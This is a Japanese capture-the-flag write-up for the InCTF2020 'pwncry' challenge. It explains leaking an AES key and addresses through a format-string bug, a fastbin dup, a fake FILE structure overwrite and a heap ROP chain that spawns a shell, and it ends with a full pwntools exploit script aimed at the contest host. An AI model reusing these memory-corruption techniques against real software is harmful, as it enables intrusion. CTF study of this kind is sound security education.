---
layout: page
title: "[writeup] InCTF2020 / pwncry"
date: 2020-08-05 00:00:00 -0000
---

なぞに満ちているので理解を整理。珍しく競技時間内に解けました。

### バイナリ
- 配布物に`libcrypto.so.1.0.0`が含まれていて、crypto pwn問のにおいがしています。`LD_PRELOAD="./libc.so.6 ./libcrypto.so.1.0.0" ./ld-linux-x86-64.so.2 ./chall`で動作させます。
- full protectionです。
- コマンドは3種あります。
    - conceal: サイズ0x70までのペイロードを暗号化して保存します。暗号はAES128CBC、IVは最初に提示されたものを利用します。9回利用できます。
    - change_name: 暗号化された名前とIVを入力すると、復号された結果が表示されます。fsbがあります。
    - remove_trace: concealで作ったヒープをfreeします。uafがあります。

- この時点でlibcが特定できないため、2回freeしてtcacheが使われないこと、gefでもtcacheなしと表示されていることから2.23に謎パッチしたものとアタリをつけます。（あとでlibc-databaseを更新したら`id libc6_2.23-0ubuntu11.2_amd64`と表示されました。謎パッチを疑ってごめんなさい。）
- uafがあるものの編集はできないので、fastbindupからmalloc_hookを想定ルートとして考えます。
- チャンクへの任意書き込みが必要 → 入力へ適切な暗号文を渡せることが必要 → 鍵の特定が必要となります。鍵は`key.txt`から起動時に渡されますが、中身がどうなっているのかはわかりません。CBCなのでパディングオラクルなのかなあとぼんやり思いながらbss領域を眺めていると、怪しい並びが気になります
```
bss+0x30:0x0000000000636261 0x0000000000000000
bss+0x40:0x5553574f4c4c4559 0x53454e4952414d42
bss+0x50:0x1b8c908db571f8e9 0xc1fb2df07ac784a3
```

- bss+0x30: 最初に入力するname3文字
- bss+0x40: key.txtの中身の鍵16文字
- bss+0x50: 最初に提示されるIV16文字

nameは最初の入力こそ3文字ですが、change_nameでは16バイトまで入力できるので、直後の`printf(name)`で鍵とIVごと全部出てくるはずです。鍵がわからずとも適当に暗号文のようなものを入れて、復号した結果がnullなしの16バイトなら、鍵がリークします。

鍵を手に入れた後は、同じくchange_nameを利用して、fsbからpie、libc、heap、stackのリークを目指します。まずは`%p%p`と入れて試そうとしたところ、上手く復号してくれません。恐ろしいことに、正常系にバグが仕込まれていました。change_nameは以下の関数を利用してデータを受けます。
```
void read_data(char *data,int data_len)

{
  size_t sVar1;
  
  fgets(data,data_len + 1,stdin);
  sVar1 = strlen(data);
  data[sVar1 - 1] = '\0';
  return;
}
```
ちゃんとnull終端やってそうでしれっと1文字消しているのが分かります。

要するに、change_nameの暗号文は16進数を文字列(`1234DEADBEEF`)で受けますが、31文字しか入力できず最後の2文字は以下のような挙動になります。

```
a. last 2byte is "12" -> "read_data" recieve as "1" -> "hextostring" decode as "\x01"
b. last 2byte is "03" -> "read_data" recieve as "0" -> "hextostring" decode as "\x00"
c. last 2byte is "3x" -> "read_data" recieve as "3" -> "hextostring" decode as "\x03"
```

要するに、復号されるバイト列のうち、最後の1バイトには`00`~`0f`しか入力できないため、バイト列の最後が"0X"になるようにIVを探せばよいです。その上で、例えば末尾を`1203`と解釈してほしい時は、`123`として送れば正しく復号してくれます。（fgetsのバッファ長-1の入力なので末尾に改行が残って、改行が消されます。）

これですべてリークができました。続いて任意書き込みです。

concealでは、暗号文のデータ長をstrlenで受けるので、nullが含まれると入力が中断されてしまいます。改行が入ってもだめなので、2つを含まないような暗号文を作る必要があります。ここでも平文の探索が必要です。

このとき１ブロック内に任意の入力が含められるようにすると、使える暗号文を入手できます。逆に１ブロックすべてが決められた値だと、nullが入った場合にそれ以上続けられなくなります。複数箇所にこのようなペイロードを作らざるを得ない場合は、成功率が非常に低くなります。

さてこれでfastbindupを作って、malloc_hookを狙いましたが、one_gadgetがすべて動かなかったため、謎パッチを疑い始めます。これをもう少しちゃんと掘れば、ここで済んでいたかもしれません。

次はio_list_all書き換えからヒープ上のsetcontext+0x35を狙ってheap ropからのsystemを狙います。狙い通り動作しましたが、forkが無限に続いてシェルが立ち上がりません。リモート環境でもどえらい出力になってしまいました。原因がよくわかりませんが、結論としてexecveでは立ち上がったので環境変数の方でなにか不都合あったのではと思っています。

しかしこの時点では、libcの関数への信用を一切捨て、heap ropからsyscallでシェルを立ち上げました。数箇所ペイロードが１ブロックを埋めてしまいましたが、そこそこ良い確率で刺さりますのでﾖｼとしました。

```python
from pwn import *
from binascii import hexlify,unhexlify
from Crypto.Cipher import AES
import struct
import os
context.log_level = 'debug'
context.arch = 'amd64'

TARGET = './chall'
HOST = '35.245.143.0'
PORT = 1337

elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        return process(['./ld-linux-x86-64.so.2', TARGET], env={"LD_PRELOAD":"./libc.so.6 ./libcrypto.so.1.0.0"})
        # return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    lines = open("/proc/{}/maps".format(proc.pid), 'rb').readlines()
    for line in lines :
        if TARGET[2:] in line.split('/')[-1] :
            break
    return int(line.split('-')[0], 16)
    # return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

def conceal(idx, size, text):
    r.sendlineafter('ID:', str(idx))
    r.sendlineafter('quest\n', '1')
    r.sendlineafter('size:\n', str(size))
    r.sendlineafter('plaintext:', text)
    r.recvuntil('concealed!\n')
    hex_ct = r.recvuntil('\n')[:-1]
    return hex_ct

def change(idx, enc_name, iv):
    r.sendlineafter('ID:', str(idx))
    r.sendlineafter('quest\n', '2')
    r.sendlineafter('name:', enc_name)
    r.sendlineafter('):', iv)

def remove(idx):
    r.sendlineafter('ID:', str(idx))
    r.sendlineafter('quest\n', '3')

while(1):
    r = start()

    r.recvuntil('IV:')
    hex_iv = r.recvuntil('\n')[:-1]
    iv = unhexlify(hex_iv)

    r.sendlineafter('code :', 'aaa')
    ct = conceal(2, 0x8, 'A')
    change(2, ct, iv)
    try:
        r.recvuntil('new name:')
        leak = r.recvuntil('Enter')
        key = leak[0x10:0x20]
        if len(hexlify(key)) != 0x20:
            r.close()
            continue
        break
    except:
        r.close()

# iv = leak[0x20:0x30]
print "KEY:", hexlify(key), len(key)
print "IV :", hexlify(iv), len(iv)

# leak libc and pie
pt = '%35$p'
pt += '\xff'*2
pt += '%34$p'
pt += '\xff'*2
pt += '\x02'*2

# 1. function "read_data" reads only 0x1f byte (in hex string). we can't fully input our block.
# 2. ct will be decrypted properly only if ct is in hex format and the last 2byte is like "0X".
#    (this bug is in the function "hextostring")
#    example:
#       a. last 2byte is "12" -> "read_data" recieve as "1" -> "hextostring" decode as "01"
#       b. last 2byte is "03" -> "read_data" recieve as "0" -> "hextostring" decode as "00"
#       c. last 2byte is "3x" -> "read_data" recieve as "3" -> "hextostring" decode as "03"
#
# 3. we have to search good iv that meets above condition. (like example c)
def search_iv(pt, key):
    ct = 'dummy'
    while (hexlify(ct)[-2] != '0'):
        random_iv = os.urandom(0x10)
        cipher = AES.new(key, AES.MODE_CBC, random_iv)
        ct = cipher.encrypt(pt)
    return ct, random_iv

# search good ct and iv
ct, random_iv = search_iv(pt, key)

# hexed ct
payload = hexlify(ct)

# strip "0"
payload = payload[:-2] + payload[-1]

# now payload length is 0x1f
change(1, payload, random_iv)

r.recvuntil('new name:')
leak = int(r.recvuntil('\xff\xff')[:-2], 16)
dbg('leak')
base = leak - 0x20840
dbg('base')
leak = int(r.recvuntil('\xff\xff')[:-2], 16)
dbg('leak')
pie = leak - 0x1a30
dbg('pie')


# leak heap
bss = pie + 0x203098
pt = '%7$sAAAA'
pt += p64(bss).strip('\x00')
pt += '\x02'*2

ct, random_iv = search_iv(pt, key)
payload = hexlify(ct)
payload = payload[:-2] + payload[-1]
change(1, payload, random_iv)

r.recvuntil('new name:')
leak = u64(r.recvuntil('AAAA')[:-4]+'\x00'*2)
dbg('leak')
heap = leak - 0x2490
dbg('heap')

io_list_all = base + 0x3c5520
setcontext = base + 0x47b50+0x35

syscall = base + 0x000bc3f5
rax = base + 0x0003a737
rdi = base + 0x0013e302
rsi = base + 0x0012ee05
rdx = base + 0x00115166

# make fastbindup with 0x70 sized chunk
conceal(3, 0x50, 'AAAA')
conceal(4, 0x50, 'BBBB')

remove(4)
remove(3)
remove(4)

# 1. text in chunk made with "conceal" is encrypted. 
# 2. this text is copy from stack to heap in "conceal" using strlen. 
# 3. "\x00" or "\x0a" will terminate our payload. so we have to search good ct this time.
# 4. we can't fill all aligned 16byte with fixed value because if there is one prohibited char in ct, it's over. this time, we can't use alternative iv.
#    example:
#       a. pt: p64(0xdeadbeef)+os.urandom(8) -> will find proper ct
#       b. pt: p64(0xdeadbeef)+p64(0xc0bebeef) -> can't search anymore
#       c. pt: p64(0xdeadbeef)+os.urandom(16)+p64(0xc0bebeef) -> will find proper ct
def search_ct(pt, iv, key):
    assert len(pt) % 0x10 == 0
    log.info("searching")
    ct = '\x00'
    while '\x00' in ct or '\x0a' in ct:
        payload = ''
        for i in range(0, len(pt), 8):
            if u64(pt[i:i+8]) == 0xdeadbeef:
                payload += os.urandom(8)
            else:   
                payload += pt[i:i+8]
        cipher = AES.new(key, AES.MODE_CBC, iv)
        ct = cipher.decrypt(payload) 
    log.info("done")
    return ct

# use fastbindup 
pt = flat(io_list_all-0x28+5, 0xdeadbeef)
ct = search_ct(pt, iv, key)
conceal(5, 0x50, ct)

# fake io struct 1
pt = p64(0xdeadbeef)*2
pt += '/bin/sh\x00'
pt += p64(0xdeadbeef)*2
pt += p64(setcontext)
pt += p64(0xdeadbeef)*2
ct = search_ct(pt, iv, key)
conceal(6, 0x50, ct)

# fake io struct 2
pt = flat(0xdeadbeef, heap+0x24c0)
pt += p64(0xdeadbeef)*6
pt += flat(heap+0x25a0, rdi+1)
ct = search_ct(pt, iv, key)
conceal(7, 0x50, ct)

# overwrite io_list_all to heap
pt = p64(heap+0x24c0)
log.info("searching")
ct = '\x00'
while '\x00' in ct or '\x0a' in ct:
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ct = cipher.decrypt(os.urandom(0x13)+pt+os.urandom(0x5)) 
log.info("done")
conceal(8, 0x50, ct)

# build rop in 0x80 sized chunk
# (this is hard part because we can't search..)
log.info("hard part here. may be need reset....")
pt = flat(rdi, heap+0x24c0, rsi, 0, rdx, 0)
pt += flat(rax, 0x3b, syscall, 0xdeadbeef, 0xdeadbeef, 0xdeadbeef)
ct = search_ct(pt, iv, key)
conceal(9, 0x60, ct)

if args.D:
    debug(r, [0x17d7])

# trigger io_flush_all
r.sendlineafter('ID:', '1')
r.sendlineafter('quest\n', '4')
r.sendafter('here?\n', 'win')

r.interactive()
r.close()
```

まとめます。
- 正常系にバグがあって、それが攻撃に乗るならともかく、単純に正しく動作しないだけというのは不思議
- 人の謎パッチを疑う前に、ちゃんと処理を追いましょう（自戒）
